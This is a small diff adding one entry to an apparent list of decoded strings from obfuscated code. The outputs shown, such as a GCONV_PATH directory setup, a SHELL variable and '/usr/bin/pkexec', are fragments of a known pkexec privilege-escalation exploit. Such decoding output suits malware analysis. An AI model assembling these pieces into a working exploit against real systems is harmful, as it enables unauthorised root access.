@@ -24,6 +24,12 @@ Output: mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./sbhqCNSNJFN'; chmod a+x 'GC
 
 
 -- START DECODING --
+Input: e91c9aefe3ae865766fbc78a331eef7d2db364fa9ec2c7337fa4310f8b8775fb2f23
+Output: SHELL=sbhqCNSNJFN
+-- END DECODING --
+
+
+-- START DECODING --
 Input: 0d2ef1b4a7faab35f51ed8ffbb2828eb67467e912ad45c76154f869a03ee
 Output: /usr/bin/pkexec
 -- END DECODING --
